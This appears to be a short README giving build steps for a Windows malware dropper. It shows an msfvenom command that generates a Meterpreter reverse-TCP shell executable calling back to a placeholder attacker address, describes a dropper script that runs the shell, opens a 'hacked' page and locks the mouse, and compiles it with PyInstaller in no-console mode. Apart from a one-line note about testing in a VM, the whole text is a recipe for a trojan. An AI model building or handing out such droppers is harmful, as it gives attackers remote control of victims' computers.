Build Instructions

1.) Generate Your Reverse Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe
```

2.) Create the Dropper

Use the provided `dropper.py` script. It:
- Runs `shell.exe`
- Opens `hacked_template.html`
- Locks the mouse for a few seconds

3.) Compile to EXE

```bash
pip install pyinstaller
pyinstaller --noconsole --onefile dropper.py
```

4.) Test in a Safe VM

Use a separate Windows VM. DO NOT run on your host.
